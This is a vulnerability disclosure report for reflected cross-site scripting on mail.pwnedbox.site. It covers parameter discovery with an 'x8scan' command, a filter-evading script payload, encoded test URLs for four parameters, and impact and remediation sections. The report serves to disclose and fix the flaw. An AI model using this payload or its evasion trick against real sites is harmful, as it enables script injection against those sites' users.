## Title
Reflected XSS - mail.pwnedbox.site

## Description
The `mail.pwnedbox.site` endpoint was tested using the `x8scan` tool, which identified seven GET parameters. Reflected XSS was successfully confirmed in four parameters: `cat`, `id`, `page`, and `page.id`, using a crafted JavaScript payload that triggered an `alert(1)` dialog.

## Steps to Reproduce

1. Open a terminal and execute the following command to discover GET parameters:

   ```bash
   echo "https://mail.pwnedbox.site/" | x8scan -w params.txt
   ```

2. Observe the transformed GET URL generated by `x8scan`:

   ```text
   https://mail.pwnedbox.site/?cat=x8scan1&fname=x8scan2&id=x8scan3&lname=x8scan4&number=x8scan5&page=x8scan6&page.id=x8scan7
   ```

3. Identify the parameters to test: `cat`, `id`, `page`, and `page.id`.

4. Replace each parameter value individually with the following crafted XSS payload:

   ```html
   hakama'"><ScRiPt>\u0061lert(1)</ScRiPt>
   ```

5. Open the modified URLs in a browser and allow the pages to load.

6. Observe the JavaScript alert dialog displaying `1` for each of the four parameters.

7. Dismiss the alert dialogs.

## POC (Proof of Concept)

**Target URL:**  
https://mail.pwnedbox.site/

**HTTP Method:** GET

**Tool Used:** x8scan

**Command Used:**
```bash
echo "https://mail.pwnedbox.site/" | x8scan -w params.txt
```

**Discovered Parameters:** `cat`, `fname`, `id`, `lname`, `number`, `page`, `page.id`

**Confirmed Vulnerable Parameters:** `cat`, `id`, `page`, `page.id`

**Payload:**
```html
hakama'"><ScRiPt>\u0061lert(1)</ScRiPt>
```

**Tested Request URLs:**

**1. cat**
```text
https://mail.pwnedbox.site/?cat=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**2. id**
```text
https://mail.pwnedbox.site/?id=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**3. page**
```text
https://mail.pwnedbox.site/?page=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**4. page.id**
```text
https://mail.pwnedbox.site/?page.id=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**Observed Result:**

The crafted JavaScript payload was successfully executed through all four tested parameters: `cat`, `id`, `page`, and `page.id`. The browser displayed an alert dialog containing `1` for each parameter, confirming Reflected Cross-Site Scripting (XSS).

## Impact

- An attacker can craft malicious URLs and trick victims into opening them.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to all affected parameters before rendering their values in HTML.
- Validate and sanitize user-controlled input to prevent HTML and JavaScript injection.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
